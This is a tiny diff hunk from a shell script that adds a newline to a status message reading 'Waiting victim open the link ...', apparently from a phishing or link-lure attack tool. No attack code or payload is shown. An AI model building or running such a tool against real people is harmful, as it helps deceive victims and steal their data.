@@ -437,7 +437,7 @@ checkfound
 checkfound() {
 
 
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
+printf "\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
 while [ true ]; do
 
 
